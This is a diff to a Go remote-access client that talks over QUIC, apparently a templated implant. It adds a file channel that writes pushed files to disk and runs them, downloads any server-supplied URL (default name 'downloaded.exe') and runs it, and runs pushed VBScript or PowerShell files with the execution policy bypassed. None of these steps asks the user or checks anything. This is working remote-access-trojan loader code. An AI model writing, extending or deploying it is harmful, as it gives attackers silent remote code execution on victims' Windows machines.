@@ -62,6 +62,7 @@ import (
     ""os""
     ""os/exec""
     ""os/signal""
+    ""path/filepath""
     ""strings""
     ""sync""
     ""syscall""
@@ -76,6 +77,7 @@ const (
     channelPing = ""ping""
     channelControl = ""control""
     channelDesktop = ""desktop""
+    channelFile = ""file""
 
     typeHello = ""hello""
     typePingRequest = ""ping_request""
@@ -84,6 +86,11 @@ const (
     typeDesktopFrame = ""frame""
     typeDesktopStart = ""desktop_start""
     typeDesktopStop = ""desktop_stop""
+    typeFileStart = ""file_start""
+    typeFileChunk = ""file_chunk""
+    typeFileEnd = ""file_end""
+    typeFileDownload = ""file_download""
+    typeRunScript = ""run_script""
 )
 
 const securityMode = ""{mode}""
@@ -112,6 +119,11 @@ type Message struct {{
     DesktopFrame  string       `json:""DesktopFrame,omitempty""`
     DesktopMonitor int         `json:""DesktopMonitor""`
     DesktopQuality int         `json:""DesktopQuality""`
+    FileData      string       `json:""FileData,omitempty""`
+    FileName      string       `json:""FileName,omitempty""`
+    FileSize      int64        `json:""FileSize""`
+    FileUrl       string       `json:""FileUrl,omitempty""`
+    RemotePath    string       `json:""RemotePath,omitempty""`
 }}
 
 type streamWriter struct {{
@@ -122,6 +134,10 @@ type streamWriter struct {{
 var (
     desktopStreamingCancel context.CancelFunc
     desktopStreamingMu     sync.Mutex
+
+    fileTransferMu   sync.Mutex
+    fileTransferPath string
+    fileTransferFile *os.File
 )
 
 func (w *streamWriter) Write(msg Message) error {{
@@ -500,6 +516,10 @@ func handleInboundStream(ctx context.Context, stream *quic.ReceiveStream, writer
             }}
         }}
 
+        if msg.Channel == channelFile {{
+            handleFileTransfer(msg)
+        }}
+
         select {{
         case <-ctx.Done():
             return ctx.Err()
@@ -688,6 +708,96 @@ func stopDesktopStreaming() {{
         desktopStreamingCancel()
         desktopStreamingCancel = nil
     }}
+}}
+
+func handleFileTransfer(msg Message) {{
+    fileTransferMu.Lock()
+    defer fileTransferMu.Unlock()
+
+    if msg.Type == typeFileStart {{
+        if fileTransferFile != nil {{
+            fileTransferFile.Close()
+            fileTransferFile = nil
+        }}
+        fileTransferPath = resolveFilePath(msg.RemotePath, msg.FileName)
+        f, err := os.Create(fileTransferPath)
+        if err != nil {{
+            return
+        }}
+        fileTransferFile = f
+        return
+    }}
+
+    if msg.Type == typeFileChunk && fileTransferFile != nil {{
+        data, err := base64.StdEncoding.DecodeString(msg.FileData)
+        if err != nil {{
+            return
+        }}
+        fileTransferFile.Write(data)
+        return
+    }}
+
+    if msg.Type == typeFileEnd && fileTransferFile != nil {{
+        fileTransferFile.Close()
+        fileTransferFile = nil
+        exec.Command(""cmd"", ""/C"", ""start"", """", fileTransferPath).Start()
+        fileTransferPath = """"
+    }}
+
+    if msg.Type == typeFileDownload && msg.FileUrl != """" {{
+        url := msg.FileUrl
+        name := msg.FileName
+        if name == """" {{
+            name = ""downloaded.exe""
+        }}
+        savePath := resolveFilePath(msg.RemotePath, name)
+        go func(u, p string) {{
+            resp, err := http.Get(u)
+            if err != nil {{
+                return
+            }}
+            defer resp.Body.Close()
+            data, err := io.ReadAll(resp.Body)
+            if err != nil {{
+                return
+            }}
+            os.WriteFile(p, data, 0755)
+            exec.Command(""cmd"", ""/C"", ""start"", """", p).Start()
+        }}(url, savePath)
+    }}
+
+    if msg.Type == typeRunScript && msg.FileData != """" && msg.FileName != """" {{
+        data, err := base64.StdEncoding.DecodeString(msg.FileData)
+        if err != nil {{
+            return
+        }}
+        ext := strings.ToLower(filepath.Ext(msg.FileName))
+        savePath := resolveFilePath(msg.RemotePath, msg.FileName)
+        os.WriteFile(savePath, data, 0755)
+        switch ext {{
+        case "".vbs"":
+            exec.Command(""cscript"", ""//NoLogo"", savePath).Start()
+        case "".ps1"":
+            exec.Command(""powershell"", ""-ExecutionPolicy"", ""Bypass"", ""-File"", savePath).Start()
+        default:
+            exec.Command(""cmd"", ""/C"", ""start"", """", savePath).Start()
+        }}
+    }}
+}}
+
+func resolveFilePath(remotePath, fileName string) string {{
+    base := remotePath
+    if base == """" {{
+        base = ""%TEMP%""
+    }}
+    if strings.HasPrefix(base, ""%"") && strings.HasSuffix(base, ""%"") {{
+        env := strings.Trim(base, ""%"")
+        expanded := os.Getenv(env)
+        if expanded != """" {{
+            base = expanded
+        }}
+    }}
+    return filepath.Join(base, fileName)
 }}
 
 func getMonitorRect(index int) (*RECT, error) {{
